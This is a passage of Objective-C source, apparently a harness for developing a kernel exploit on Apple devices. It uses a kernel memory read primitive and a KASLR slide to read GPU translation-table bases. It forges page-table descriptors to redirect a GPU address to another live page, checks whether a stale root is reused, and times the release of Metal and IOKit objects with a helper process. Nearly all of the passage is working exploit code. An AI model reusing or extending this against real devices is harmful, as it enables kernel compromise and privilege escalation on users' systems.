        @"snapshotPassed": @(snapshotPassed),
        @"openChanges": openChanges ?: @[],
        @"exactOpen": @(openTransition != nil),
        @"expectedContextID": @(expectedContextID),
        @"sameContextPassed": @(sameContextPassed),
        @"root0": CNDUatE1Hex(latchRoot0),
        @"root1": CNDUatE1Hex(latchRoot1),
    };
    CNDUatE1Persist(report);
    if (!sameContextPassed) {
        if (reasonOut != NULL) *reasonOut = @"e3-latch-same-context-gate-failed";
        goto done;
    }

    primaryPathPassed = CNDUatE3ResolveLivePath(
        api, walker, ready.gpuAddress, latchRoot0, latchRoot1,
        &primaryPath, &primaryPathReason);
    secondaryPathPassed = primaryPathPassed && CNDUatE3ResolveLivePath(
        api, walker, ready.secondaryGPUAddress, latchRoot0, latchRoot1,
        &secondaryPath, &secondaryPathReason);
    pathPairPassed = primaryPathPassed && secondaryPathPassed &&
        primaryPath.rootIndex == expectedRootIndex &&
        secondaryPath.rootIndex == expectedRootIndex &&
        primaryPath.catalogueIndex == secondaryPath.catalogueIndex &&
        primaryPath.directoryIndex == secondaryPath.directoryIndex &&
        primaryPath.leafIndex != secondaryPath.leafIndex &&
        primaryPath.rootPhysical == secondaryPath.rootPhysical &&
        primaryPath.directoryPhysical == secondaryPath.directoryPhysical &&
        primaryPath.tablePhysical == secondaryPath.tablePhysical &&
        primaryPath.leafPhysical != secondaryPath.leafPhysical &&
        primaryPath.rootPhysical != capturedPlan->rootPhysical &&
        primaryPath.directoryPhysical != capturedPlan->directoryPhysical &&
        primaryPath.tablePhysical != capturedPlan->tablePhysical;
    report[@"e3LatchLivePaths"] = @{
        @"primaryValidated": @(primaryPathPassed),
        @"primaryReason": primaryPathReason != NULL
            ? [NSString stringWithUTF8String:primaryPathReason] : @"none",
        @"secondaryValidated": @(secondaryPathPassed),
        @"secondaryReason": secondaryPathReason != NULL
            ? [NSString stringWithUTF8String:secondaryPathReason] : @"none",
        @"pairPassed": @(pathPairPassed),
        @"primaryLeafIndex": @(primaryPath.leafIndex),
        @"secondaryLeafIndex": @(secondaryPath.leafIndex),
        @"freshRootPhysical": CNDUatE1Hex(primaryPath.rootPhysical),
        @"freshDirectoryPhysical": CNDUatE1Hex(primaryPath.directoryPhysical),
        @"freshTablePhysical": CNDUatE1Hex(primaryPath.tablePhysical),
        @"secondaryLeafEntry": CNDUatE1Hex(secondaryPath.leafEntry),
        @"secondaryLeafPhysical": CNDUatE1Hex(secondaryPath.leafPhysical),
    };
    CNDUatE1Persist(report);
    if (!pathPairPassed) {
        if (reasonOut != NULL) *reasonOut = @"e3-latch-live-path-pair-failed";
        goto done;
    }

    for (NSUInteger index = 0; index < 3; index++) {
        NSUInteger readCalls = 0;
        const char *translationReason = NULL;
        bool translated = CNDUatE2TranslateContiguousPages(
            api, walker, ownedVirtuals[index], 1,
            &ownedTranslations[index], &readCalls, &translationReason);
        ownershipTranslationReadCalls += readCalls;
        ownershipTranslationsPassed = ownershipTranslationsPassed &&
            translated &&
            ownedTranslations[index].virtualAddress == ownedVirtuals[index] &&
            ownedTranslations[index].physicalFrame == ownedPhysical[index];
        bool stable = CNDUatE2ReadStable64(
            api, ownershipOracles[index].wordAddress,
            &ownershipMaskWords[index]);
        ownershipMasksClear = ownershipMasksClear && stable &&
            (ownershipMaskWords[index] & ownershipOracles[index].bitMask) == 0;
    }
    bool ownershipPassed = ownershipTranslationsPassed &&
        ownershipMasksClear && CNDUatE2WalkerAnchorsStable(api, walker);
    report[@"e3LatchCapturedOwnership"] = @{
        @"passed": @(ownershipPassed),
        @"translationsPassed": @(ownershipTranslationsPassed),
        @"freeMaskBitsClear": @(ownershipMasksClear),
        @"translationCheckedReadCalls": @(ownershipTranslationReadCalls),
        @"stableMaskCheckedReadCalls": @6,
        @"rootVirtual": CNDUatE1Hex(capturedPlan->rootVirtual),
        @"directoryVirtual": CNDUatE1Hex(capturedPlan->directoryVirtual),
        @"tableVirtual": CNDUatE1Hex(capturedPlan->tableVirtual),
        @"kernelWrites": @0,
    };
    CNDUatE1Persist(report);
    if (!ownershipPassed) {
        if (reasonOut != NULL) *reasonOut = @"e3-latch-captured-ownership-failed";
        goto done;
    }

    uint8_t *rootPage = (uint8_t *)(uintptr_t)capturedPlan->rootVirtual;
    uint8_t *directoryPage = (uint8_t *)(uintptr_t)capturedPlan->directoryVirtual;
    uint8_t *tablePage = (uint8_t *)(uintptr_t)capturedPlan->tableVirtual;
    memset(rootPage, 0, CNDUatE1PageSize);
    memset(directoryPage, 0, CNDUatE1PageSize);
    memset(tablePage, 0, CNDUatE1PageSize);
    uint64_t rootDescriptor = capturedPlan->directoryPhysical | 3;
    uint64_t directoryDescriptor = capturedPlan->tablePhysical | 3;
    uint64_t leafDescriptor = secondaryPath.leafEntry;
    ((volatile uint64_t *)rootPage)[primaryPath.catalogueIndex] = rootDescriptor;
    ((volatile uint64_t *)directoryPage)[primaryPath.directoryIndex] =
        directoryDescriptor;
    ((volatile uint64_t *)tablePage)[primaryPath.leafIndex] = leafDescriptor;
    __sync_synchronize();
    programmed =
        ((volatile uint64_t *)rootPage)[primaryPath.catalogueIndex] ==
            rootDescriptor &&
        ((volatile uint64_t *)directoryPage)[primaryPath.directoryIndex] ==
            directoryDescriptor &&
        ((volatile uint64_t *)tablePage)[primaryPath.leafIndex] ==
            leafDescriptor;
    report[@"e3LatchProgram"] = @{
        @"programmed": @(programmed),
        @"ownUserPagesOnly": @YES,
        @"ownPageWriteCount": @3,
        @"kernelWrites": @0,
        @"rootIndex": @(expectedRootIndex),
        @"catalogueIndex": @(primaryPath.catalogueIndex),
        @"directoryIndex": @(primaryPath.directoryIndex),
        @"leafIndex": @(primaryPath.leafIndex),
        @"rootDescriptor": CNDUatE1Hex(rootDescriptor),
        @"directoryDescriptor": CNDUatE1Hex(directoryDescriptor),
        @"leafDescriptor": CNDUatE1Hex(leafDescriptor),
        @"leafRedirect": @"primary-gpu-va-to-secondary-live-leaf",
    };
    CNDUatE1Persist(report);
    if (!programmed) {
        if (reasonOut != NULL) *reasonOut = @"e3-latch-owned-page-program-failed";
        goto done;
    }

    uint8_t submit = CNDUatE2ExternalSubmitByte;
    submitSent = CNDUatE2WriteAll(rendezvous.peerFD, &submit, sizeof(submit));
    completedPassed = submitSent && CNDUatE2ReadExternalMessage(
        rendezvous.peerFD, rendezvous.token,
        CNDUatE2ExternalMessageCompleted, &completed);
    completedPassed = completedPassed && completed.result == 0 &&
        completed.pid == ready.pid &&
        completed.mode == CNDUatE2ExternalModeLatch &&
        completed.gpuAddress == ready.gpuAddress &&
        completed.secondaryGPUAddress == ready.secondaryGPUAddress &&
        completed.metalStatus == 4 && completed.fillVerified == 1;
    freshObserved = completedPassed &&
        completed.primaryPatternBytes == CNDUatE1PageSize &&
        completed.secondaryPatternBytes == 0;
    staleObserved = completedPassed &&
        completed.primaryPatternBytes == 0 &&
        completed.secondaryPatternBytes == CNDUatE1PageSize;
    report[@"e3LatchCompletion"] = @{
        @"submitSent": @(submitSent),
        @"completedPassed": @(completedPassed),
        @"metalStatus": @(completed.metalStatus),
        @"fillVerified": @(completed.fillVerified),
        @"primaryPatternBytes": @(completed.primaryPatternBytes),
        @"secondaryPatternBytes": @(completed.secondaryPatternBytes),
        @"freshRootObserved": @(freshObserved),
        @"staleRootObserved": @(staleObserved),
        @"outcome": staleObserved ? @"stale-root-used" :
            (freshObserved ? @"fresh-root-used" : @"ambiguous"),
    };
    CNDUatE1Persist(report);
    log_user("[UAT_E3] latch-completed pid=%u primaryBytes=%u "
             "secondaryBytes=%u outcome=%s\n", completed.pid,
             completed.primaryPatternBytes, completed.secondaryPatternBytes,
             staleObserved ? "stale-root-used" :
                (freshObserved ? "fresh-root-used" : "ambiguous"));
    if (!freshObserved && !staleObserved) {
        if (reasonOut != NULL) *reasonOut = @"e3-latch-result-ambiguous";
        goto done;
    }

    uint8_t release = CNDUatE2ChildReleaseByte;
    releaseSent = CNDUatE2WriteAll(rendezvous.peerFD, &release, sizeof(release));
    exitingPassed = releaseSent && CNDUatE2ReadExternalMessage(
        rendezvous.peerFD, rendezvous.token,
        CNDUatE2ExternalMessageExiting, &exiting) &&
        exiting.pid == ready.pid && exiting.result == 0;
    peerEOF = exitingPassed && CNDUatE2WaitForExternalPeerEOF(rendezvous.peerFD);
    if (rendezvous.peerFD >= 0) {
        close(rendezvous.peerFD);
        rendezvous.peerFD = -1;
    }
    processGone = peerEOF && CNDUatE2WaitForProcessGone(
        (pid_t)ready.pid, &processGoneAttempts, &processGoneErrno);
    if (!processGone) {
        if (reasonOut != NULL) *reasonOut = @"e3-latch-helper-exit-failed";
    }

done:
    report[@"e3LatchHelperExit"] = @{
        @"releaseSent": @(releaseSent),
        @"exitingPassed": @(exitingPassed),
        @"peerEOF": @(peerEOF),
        @"processGone": @(processGone),
        @"processGonePollAttempts": @(processGoneAttempts),
        @"processGoneErrno": @(processGoneErrno),
    };
    bool passed = (freshObserved || staleObserved) && processGone;
    report[@"e3StaleRootLatch"] = @{
        @"attempted": @YES,
        @"passed": @(passed),
        @"staleRootObserved": @(staleObserved),
        @"freshRootObserved": @(freshObserved),
        @"kernelWrites": @0,
        @"ownUserPageWrites": @(programmed ? 3 : 0),
        @"failureReason": reasonOut != NULL && *reasonOut != nil
            ? *reasonOut : @"none",
    };
    CNDUatE2CloseExternalRendezvous(&rendezvous);
    CNDUatE1Persist(report);
    if (passed && staleObservedOut != NULL) *staleObservedOut = staleObserved;
    return passed;
}

static CNDUatE1TTBATRunResult CNDUatE5RunOwnerReleaseRoute(
    NSMutableDictionary<NSString *, id> *report, const CNDUatE1API *api,
    uint64_t slide, BOOL deviceReleaseGate, BOOL connectionReleaseGate,
    BOOL rawQueueReleaseGate, BOOL rawQueueBindReleaseGate,
    NSString **reasonOut)
{
    BOOL privateOwnerReleaseGate =
        deviceReleaseGate || connectionReleaseGate;
    BOOL rawQueueExperimentGate =
        rawQueueReleaseGate || rawQueueBindReleaseGate;
    uint32_t expectedMode = rawQueueBindReleaseGate
        ? CNDUatE5ExternalModeRawQueueBindRelease
        : (rawQueueReleaseGate
        ? CNDUatE5ExternalModeRawQueueRelease
        : (connectionReleaseGate
        ? CNDUatE5ExternalModeConnectionRelease
        : (deviceReleaseGate ? CNDUatE5ExternalModeDeviceRelease
                             : CNDUatE5ExternalModeOwnerRelease)));
    uint32_t releaseMarker = rawQueueBindReleaseGate
        ? CNDUatE5RawQueueBindReleaseMarker
        : (rawQueueReleaseGate
        ? CNDUatE5RawQueueReleaseMarker
        : (connectionReleaseGate
        ? CNDUatE5ConnectionReleaseMarker
        : (deviceReleaseGate ? CNDUatE5DeviceReleaseMarker
                             : CNDUatE5ReleaseMarker)));
    uint32_t controlMarker = rawQueueBindReleaseGate
        ? CNDUatE5RawQueueBindControlMarker
        : (rawQueueReleaseGate
        ? CNDUatE5RawQueueControlMarker
        : (connectionReleaseGate
        ? CNDUatE5ConnectionControlMarker
        : (deviceReleaseGate ? CNDUatE5DeviceControlMarker
                             : CNDUatE4ControlMarker)));
    uint32_t requiredOwnerMask = rawQueueExperimentGate
        ? CNDUatE5OwnerQueue
        : (connectionReleaseGate
        ? CNDUatE5RequiredConnectionMask
        : (deviceReleaseGate ? CNDUatE5RequiredDeviceMask
                             : CNDUatE5RequiredOwnerMask));
    uint32_t expectedWorkloadRounds =
        (!connectionReleaseGate && !rawQueueExperimentGate)
            ? CNDUatE4WorkloadRounds : 0U;
    NSString *modeName = rawQueueBindReleaseGate
        ? @"raw-queue-bind-release"
        : (rawQueueReleaseGate
        ? @"raw-queue-release"
        : (connectionReleaseGate
        ? @"connection-release"
        : (deviceReleaseGate ? @"device-release" : @"owner-release")));
    CNDUatE1TTBATRunResult result = CNDUatE1TTBATRunAborted;
    CNDUatE1TTBATSnapshot before = {0};
    CNDUatE1TTBATSnapshot whileOpen = {0};
    CNDUatE1TTBATSnapshot afterCleanup = {0};
    NSDictionary *beforeSummary = nil;
    NSDictionary *whileSummary = nil;
    NSDictionary *afterSummary = nil;
    NSArray *openChanges = nil;
    NSArray *cleanupChanges = nil;
    NSDictionary *openTransition = nil;
    NSMutableArray *samples = [NSMutableArray array];
    NSString *tokenHex = @"";
    NSString *sharedFileName = @"";
    NSURL *groupContainerURL = nil;
    NSURL *sharedFileURL = nil;
    CNDUatE2ExternalRendezvous rendezvous = {
        .listenFD = -1, .peerFD = -1, .port = 0,
    };
    CNDUatE2ExternalMessage readyMessage = {0};
    CNDUatE2ExternalMessage drainedMessage = {0};
    CNDUatE2ExternalMessage completedMessage = {0};
    int sharedFD = -1;
    struct stat sharedStat = {0};
    void *sharedMapping = MAP_FAILED;
    volatile uint32_t *sharedWords = NULL;
    NSUInteger observedIndex = NSNotFound;
    NSUInteger clearAttempt = NSNotFound;
    NSUInteger processGoneAttempts = 0;
    int processGoneErrno = 0;
    int rendezvousError = 0;
    int sharedFileOpenError = 0;
    int sharedFileMapError = 0;
    int sharedFileSyncError = 0;
    uint32_t controlObserved = 0;
    uint32_t resetObserved = UINT32_MAX;
    uint32_t releaseMarkerObserved = 0;
    bool sharedFileCreated = false;
    bool sharedFileMapped = false;
    bool sharedFilePrepared = false;
    bool sharedFileIdentityPassed = false;
    bool rendezvousOpened = false;
    bool helperAccepted = false;
    bool configSent = false;
    bool helperReady = false;
    bool controlPassed = false;
    bool resetPassed = false;
    bool submitSent = false;
    bool drainMessagePassed = false;
    bool ownersReleased = false;
    bool helperAliveAfterDrain = false;
    bool helperAliveThroughoutPoll = true;
    bool pollReadsPassed = true;
    bool clearObserved = false;
    bool releaseSent = false;
    bool completedPassed = false;
    bool peerEOF = false;
    bool processGone = false;
    bool finalSnapshotPassed = false;
    bool exactCleanupClosePassed = false;
    NSUInteger rawCleanupChangedCount = 0;
    bool cleanupUnmapped = false;
    bool cleanupClosed = false;
    bool cleanupUnlinked = false;

    uint64_t readyAddress = CNDUatE1IOUATMapsReady + slide;
    CNDUatE1Progress(report, @"e5.ttbat", @"read-maps-ready", readyAddress);
    uint8_t ready = 0;
    if (!CNDUatE1Read8(api, readyAddress, &ready) || ready != 2) {
        report[@"ttbatMapsReady"] = @(ready);
        if (reasonOut != NULL) *reasonOut = @"e5-ttbat-maps-not-ready";
        goto done;
    }
    uint64_t mapSlotAddress = CNDUatE1TTBATMapVA + slide;
    CNDUatE1Progress(report, @"e5.ttbat", @"read-retained-map-va",
                     mapSlotAddress);
    uint64_t ttbatRaw = 0;
    if (!CNDUatE1Read64(api, mapSlotAddress, &ttbatRaw)) {
        if (reasonOut != NULL) *reasonOut = @"e5-ttbat-map-read-failed";
        goto done;
    }
    uint64_t ttbat = CNDUatE1CanonicalPointer(api, ttbatRaw);
    bool ttbatPassed = ttbatRaw == ttbat && ttbat != 0 &&
        (ttbat & (CNDUatE1PageSize - 1)) == 0 &&
        sizeof(before) <= CNDUatE1PageSize;
    report[@"ttbatMapPredicate"] = @{
        @"slotAddress": CNDUatE1Hex(mapSlotAddress),
        @"raw": CNDUatE1Hex(ttbatRaw),
        @"canonical": CNDUatE1Hex(ttbat),
        @"aligned16K": @((ttbat & (CNDUatE1PageSize - 1)) == 0),
        @"mappingTarget": @"permanent-kernel-task",
        @"staticLifetimeWitness":
            @"C26-E1-TTBAT-EL1-MAP-LIFETIME-TRACE-20261105",
        @"passed": @(ttbatPassed),
    };
    CNDUatE1Persist(report);
    if (!ttbatPassed) {
        if (reasonOut != NULL) *reasonOut = @"e5-ttbat-map-predicate-failed";
        goto done;
    }
    if (!CNDUatE1SnapshotTTBAT(
            report, api, @"e5.before", ttbat, &before, &beforeSummary)) {
        if (reasonOut != NULL) *reasonOut = @"e5-before-snapshot-failed";
        goto done;
    }
    report[@"tableReached"] = @YES;
    report[@"beforeTTBATSnapshot"] = beforeSummary;
    CNDUatE1Persist(report);

    CNDUatE1Progress(
        report, @"e5.action", @"open-external-helper-rendezvous", 0);
    rendezvousOpened = CNDUatE2OpenExternalRendezvous(
        &rendezvous, &rendezvousError);
    tokenHex = CNDUatE2TokenHex(rendezvous.token);
    if (!rendezvousOpened) {
        if (reasonOut != NULL) *reasonOut = @"e5-rendezvous-failed";
        goto done;
    }

    groupContainerURL = [[NSFileManager defaultManager]
        containerURLForSecurityApplicationGroupIdentifier:
            CNDUatE4AppGroupIdentifier];
    sharedFileName = [NSString stringWithFormat:
        rawQueueBindReleaseGate ? @"e5b-%@.bin" :
        (rawQueueReleaseGate ? @"e5q-%@.bin" :
        (connectionReleaseGate ? @"e5c-%@.bin" :
            (deviceReleaseGate ? @"e5d-%@.bin" : @"e5-%@.bin"))),
        tokenHex];
    sharedFileURL = groupContainerURL != nil
        ? [groupContainerURL URLByAppendingPathComponent:
            sharedFileName isDirectory:NO]
        : nil;
    if (sharedFileURL != nil) {
        sharedFD = open(sharedFileURL.fileSystemRepresentation,
                        O_CREAT | O_EXCL | O_RDWR | O_CLOEXEC,
                        S_IRUSR | S_IWUSR);
        if (sharedFD < 0) sharedFileOpenError = errno;
    }
    sharedFileCreated = sharedFD >= 0;
    bool sizePassed = sharedFileCreated &&
        ftruncate(sharedFD, CNDUatE1PageSize) == 0;
    bool statPassed = sizePassed && fstat(sharedFD, &sharedStat) == 0;
    sharedFileIdentityPassed = statPassed &&
        S_ISREG(sharedStat.st_mode) &&
        sharedStat.st_size == CNDUatE1PageSize &&
        sharedStat.st_uid == getuid() && sharedStat.st_nlink == 1 &&
        (uint64_t)sharedStat.st_dev != 0 &&
        (uint64_t)sharedStat.st_ino != 0;
    if (sharedFileIdentityPassed) {
        sharedMapping = mmap(NULL, CNDUatE1PageSize,
                             PROT_READ | PROT_WRITE, MAP_SHARED,
                             sharedFD, 0);
        if (sharedMapping == MAP_FAILED) sharedFileMapError = errno;
    }
    sharedFileMapped = sharedMapping != MAP_FAILED;
    if (sharedFileMapped) {
        sharedWords = (volatile uint32_t *)sharedMapping;
        memset(sharedMapping, 0, CNDUatE1PageSize);
        __sync_synchronize();
        if (msync(sharedMapping, CNDUatE1PageSize, MS_SYNC) != 0) {
            sharedFileSyncError = errno;
        }
        sharedFilePrepared = sharedFileSyncError == 0 &&
            __atomic_load_n(sharedWords, __ATOMIC_SEQ_CST) == 0;
    }
    report[@"e5SharedCanary"] = @{
        @"transport": @"app-group-map-shared-file",
        @"groupIdentifier": CNDUatE4AppGroupIdentifier,
        @"groupContainerResolved": @(groupContainerURL != nil),
        @"fileName": sharedFileName,
        @"createdExclusive": @(sharedFileCreated),
        @"openError": @(sharedFileOpenError),
        @"mappedShared": @(sharedFileMapped),
        @"mapError": @(sharedFileMapError),
        @"syncError": @(sharedFileSyncError),
        @"device": CNDUatE1Hex((uint64_t)sharedStat.st_dev),
        @"inode": CNDUatE1Hex((uint64_t)sharedStat.st_ino),
        @"identityPassed": @(sharedFileIdentityPassed),
        @"passed": @(sharedFilePrepared),
    };
    CNDUatE1Persist(report);
    if (!sharedFilePrepared) {
        if (reasonOut != NULL) *reasonOut =
            @"e5-app-group-shared-file-preflight-failed";
        goto done;
    }

    report[@"externalHelperRendezvous"] = @{
        @"opened": @(rendezvousOpened),
        @"error": @(rendezvousError),
        @"observerPID": @(getpid()),
        @"port": @(rendezvous.port),
        @"token": tokenHex,
        @"address": @"127.0.0.1",
        @"loopbackOnly": @YES,
        @"helperBundleID": CNDUatE4HelperBundleIdentifier,
        @"protocolVersion": @(CNDUatE2ExternalMessageVersion),
        @"sharedFileName": sharedFileName,
        @"helperTouchesKRWLifecycle": @NO,
        @"hostLaunchRequired": @YES,
    };
    CNDUatE1Persist(report);
    log_user("[UAT_E5] external-helper-ready observerPid=%d port=%u "
             "token=%s bundle=%s mode=%s file=%s "
             "dev=0x%llx inode=0x%llx\n",
             getpid(), rendezvous.port, tokenHex.UTF8String,
             CNDUatE4HelperBundleIdentifier.UTF8String,
             modeName.UTF8String,
             sharedFileName.UTF8String,
             (unsigned long long)sharedStat.st_dev,
             (unsigned long long)sharedStat.st_ino);

    helperAccepted = CNDUatE2AcceptExternalHelper(
        &rendezvous, &rendezvousError);
    CNDUatE4Config config = {
        .magic = CNDUatE4ConfigMagic,
        .version = CNDUatE4ConfigVersion,
        .controlMarker = controlMarker,
        .terminalMarker = releaseMarker,
        .workloadRounds = 0,
        .reserved = 0,
        .fileDevice = (uint64_t)sharedStat.st_dev,
        .fileInode = (uint64_t)sharedStat.st_ino,
    };
    memcpy(config.token, rendezvous.token, sizeof(config.token));
    configSent = helperAccepted && CNDUatE2WriteAll(
        rendezvous.peerFD, &config, sizeof(config));
    helperReady = configSent && CNDUatE2ReadExternalMessage(
        rendezvous.peerFD, rendezvous.token,
        CNDUatE2ExternalMessageReady, &readyMessage);
    helperReady = helperReady && readyMessage.result == 0 &&
        readyMessage.mode == expectedMode &&
        (rawQueueExperimentGate
            ? readyMessage.surfaceID != 0
            : readyMessage.surfaceID == 0) &&
        readyMessage.gpuAddress == (uint64_t)sharedStat.st_dev &&
        readyMessage.secondaryGPUAddress == (uint64_t)sharedStat.st_ino &&
        readyMessage.workloadRounds == expectedWorkloadRounds &&
        readyMessage.reserved ==
            ((privateOwnerReleaseGate || rawQueueExperimentGate) ? 1U : 0U) &&
        readyMessage.markerValue == controlMarker &&
        readyMessage.metalStatus ==
            ((connectionReleaseGate || rawQueueExperimentGate) ? 0U : 4U) &&
        readyMessage.fillVerified == 1;
    if (helperReady) {
        controlObserved = __atomic_load_n(sharedWords, __ATOMIC_SEQ_CST);
        controlPassed = controlObserved == controlMarker;
    }
    report[@"e5LiveControl"] = @{
        @"helperAccepted": @(helperAccepted),
        @"acceptError": @(rendezvousError),
        @"configSent": @(configSent),
        @"readyMessagePassed": @(helperReady),
        @"pid": @(readyMessage.pid),
        @"metalStatus": @(readyMessage.metalStatus),
        @"scheduledWorkloadRounds": @(readyMessage.workloadRounds),
        @"scheduledWorkloadRequired": @(expectedWorkloadRounds != 0),
        @"privateDeviceFactoryFinalized": @(
            deviceReleaseGate && readyMessage.reserved == 1),
        @"lowLevelConnectionDeviceRefValidated": @(
            connectionReleaseGate && readyMessage.reserved == 1),
        @"rawIOQueueID": rawQueueExperimentGate
            ? @(readyMessage.surfaceID) : @0,
        @"rawIOQueueToken": rawQueueReleaseGate
            ? @(readyMessage.secondaryPatternBytes) : @0,
        @"rawIONotificationQueueID": rawQueueBindReleaseGate
            ? @(readyMessage.secondaryPatternBytes) : @0,
        @"rawType1ConnectionValidated": @(
            rawQueueExperimentGate && readyMessage.reserved == 1),
        @"controlProducedByGPU": @(
            !connectionReleaseGate && !rawQueueExperimentGate),
        @"controlMarkerExpected": CNDUatE1Hex(controlMarker),
        @"controlMarkerObserved": CNDUatE1Hex(controlObserved),
        @"passed": @(controlPassed),
    };
    CNDUatE1Persist(report);
    if (!helperReady || !controlPassed) {
        if (reasonOut != NULL) *reasonOut = @"e5-live-control-failed";
        goto done;
    }

    sharedWords[0] = 0;
    __sync_synchronize();
    int resetSync = msync(sharedMapping, CNDUatE1PageSize, MS_SYNC);
    resetObserved = __atomic_load_n(sharedWords, __ATOMIC_SEQ_CST);
    resetPassed = resetSync == 0 && resetObserved == 0;
    report[@"e5CanaryReset"] = @{
        @"expected": @0,
        @"observed": CNDUatE1Hex(resetObserved),
        @"passed": @(resetPassed),
    };
    CNDUatE1Persist(report);
    if (!resetPassed) {
        if (reasonOut != NULL) *reasonOut = @"e5-canary-reset-failed";
        goto done;
    }

    if (!CNDUatE1SnapshotTTBAT(
            report, api, @"e5.while-open", ttbat,
            &whileOpen, &whileSummary)) {
        if (reasonOut != NULL) *reasonOut = @"e5-while-open-snapshot-failed";
        goto done;
    }
    openChanges = CNDUatE1TTBATDiff(&before, &whileOpen, ttbat, @"open");
    openTransition = CNDUatE2ExactOpenTransition(openChanges);
    observedIndex = openTransition != nil
        ? [openTransition[@"index"] unsignedIntegerValue] : NSNotFound;
    report[@"whileOpenTTBATSnapshot"] = whileSummary;
    report[@"openChanges"] = openChanges ?: @[];
    report[@"e5ContextIndex"] = observedIndex != NSNotFound
        ? @(observedIndex) : (id)[NSNull null];
    CNDUatE1Persist(report);
    if (openTransition == nil || observedIndex >= CNDUatE1TTBATEntries) {
        if (reasonOut != NULL) *reasonOut = @"e5-exact-open-transition-failed";
        goto done;
    }
    log_user("[UAT_E5] live-control passed pid=%u context=%lu "
             "root0=0x%016llx root1=0x%016llx\n",
             readyMessage.pid, (unsigned long)observedIndex,
             (unsigned long long)(whileOpen.words[observedIndex * 2] &
                 CNDUatE1TTBATPaddrMask),
             (unsigned long long)(whileOpen.words[observedIndex * 2 + 1] &
                 CNDUatE1TTBATPaddrMask));

    uint8_t submit = CNDUatE2ExternalSubmitByte;
    submitSent = CNDUatE2WriteAll(
        rendezvous.peerFD, &submit, sizeof(submit));
    drainMessagePassed = submitSent && CNDUatE2ReadExternalMessage(
        rendezvous.peerFD, rendezvous.token,
        CNDUatE2ExternalMessageExiting, &drainedMessage);
    drainMessagePassed = drainMessagePassed && drainedMessage.result == 0 &&
        drainedMessage.pid == readyMessage.pid &&
        drainedMessage.mode == expectedMode &&
        drainedMessage.gpuAddress == (uint64_t)sharedStat.st_dev &&
        drainedMessage.secondaryGPUAddress == (uint64_t)sharedStat.st_ino &&
        drainedMessage.workloadRounds == expectedWorkloadRounds &&
        drainedMessage.reserved == 1 &&
        drainedMessage.markerValue == releaseMarker &&
        drainedMessage.metalStatus ==
            ((connectionReleaseGate || rawQueueExperimentGate) ? 0U : 4U);
    ownersReleased = drainMessagePassed && drainedMessage.fillVerified == 1 &&
        drainedMessage.primaryPatternBytes == requiredOwnerMask &&
        drainedMessage.secondaryPatternBytes == requiredOwnerMask;
    releaseMarkerObserved = __atomic_load_n(sharedWords, __ATOMIC_SEQ_CST);
    errno = 0;
    int aliveRC = readyMessage.pid > 1
        ? kill((pid_t)readyMessage.pid, 0) : -1;
    int aliveErrno = errno;
    helperAliveAfterDrain = aliveRC == 0 ||
        (aliveRC == -1 && aliveErrno == EPERM);
    report[@"e5OwnerDrainGate"] = @{
        @"submitSent": @(submitSent),
        @"authenticatedDrainMessage": @(drainMessagePassed),
        @"releasedMask": CNDUatE1Hex(drainedMessage.primaryPatternBytes),
        @"requiredMask": CNDUatE1Hex(requiredOwnerMask),
        @"allHelperOwnedMetalObjectsReleased": @(ownersReleased),
        @"deviceReleaseRequired": @(privateOwnerReleaseGate),
        @"lowLevelConnectionReleaseRequired": @(connectionReleaseGate),
        @"rawIOQueueReleaseRequired": @(rawQueueExperimentGate),
        @"deviceStillAliveAfterDrain": @(drainedMessage.surfaceID == 1),
        @"systemDeviceStillAlive": @(drainedMessage.reserved == 1),
        @"privateDeviceReleased": @(deviceReleaseGate &&
            drainedMessage.surfaceID == 0),
        @"lowLevelConnectionOwnerReleased": @(connectionReleaseGate &&
            drainedMessage.surfaceID == 0),
        @"rawIOQueueReleased": @(rawQueueExperimentGate &&
            drainedMessage.surfaceID == 0),
        @"releaseMarkerExpected": CNDUatE1Hex(releaseMarker),
        @"releaseMarkerObserved": CNDUatE1Hex(releaseMarkerObserved),
        @"helperAlive": @(helperAliveAfterDrain),
        @"helperAliveErrno": @(aliveErrno),
        @"processExitAuthorized": @NO,
        @"passed": @(ownersReleased && helperAliveAfterDrain &&
            releaseMarkerObserved == releaseMarker &&
            drainedMessage.reserved == 1 &&
            ((privateOwnerReleaseGate || rawQueueExperimentGate)
                ? drainedMessage.surfaceID == 0
                : drainedMessage.surfaceID == 1)),
    };
    CNDUatE1Persist(report);
    if (!ownersReleased || !helperAliveAfterDrain ||
        releaseMarkerObserved != releaseMarker ||
        drainedMessage.reserved != 1 ||
        ((privateOwnerReleaseGate || rawQueueExperimentGate)
            ? drainedMessage.surfaceID != 0
            : drainedMessage.surfaceID != 1)) {
        if (reasonOut != NULL) *reasonOut = @"e5-owner-drain-gate-failed";
        goto done;
    }

    uint64_t entryAddress = ttbat + observedIndex * CNDUatE1TTBATStride;
    log_user("[UAT_E5] owners-drained helper-alive=1 releasedMask=0x%08x "
             "polling exact-entry=0x%016llx reads=%u intervalUS=%u\n",
             drainedMessage.primaryPatternBytes,
             (unsigned long long)entryAddress,
             CNDUatE4PollCount, CNDUatE4PollIntervalUS);
    for (NSUInteger attempt = 0; attempt < CNDUatE4PollCount; attempt++) {
        errno = 0;
        int pollAliveRC = kill((pid_t)readyMessage.pid, 0);
        int pollAliveErrno = errno;
        bool aliveBefore = pollAliveRC == 0 ||
            (pollAliveRC == -1 && pollAliveErrno == EPERM);
        uint64_t words[2] = {0};
        uint64_t timestamp = mach_continuous_time();
        bool readPassed = CNDUatE1Read(
            api, entryAddress, words, sizeof(words));
        uint32_t marker = __atomic_load_n(sharedWords, __ATOMIC_SEQ_CST);
        errno = 0;
        pollAliveRC = kill((pid_t)readyMessage.pid, 0);
        pollAliveErrno = errno;
        bool aliveAfter = pollAliveRC == 0 ||
            (pollAliveRC == -1 && pollAliveErrno == EPERM);
        bool valid = (words[0] & 1) != 0 || (words[1] & 1) != 0;
        [samples addObject:@{
            @"attempt": @(attempt + 1),
            @"timestampMachContinuous": CNDUatE1Hex(timestamp),
            @"word0": CNDUatE1Hex(words[0]),
            @"word1": CNDUatE1Hex(words[1]),
            @"marker": CNDUatE1Hex(marker),
            @"readPassed": @(readPassed),
            @"valid": @(valid),
            @"helperAliveBefore": @(aliveBefore),
            @"helperAliveAfter": @(aliveAfter),
        }];
        if (!readPassed) {
            pollReadsPassed = false;
            break;
        }
        if (!aliveBefore || !aliveAfter) {
            helperAliveThroughoutPoll = false;
            break;
        }
        if (!valid) {
            clearObserved = true;
            clearAttempt = attempt;
            break;
        }
        if (attempt + 1 < CNDUatE4PollCount) {
            usleep(CNDUatE4PollIntervalUS);
        }
    }
    report[@"e5OwnerReleaseObservation"] = @{
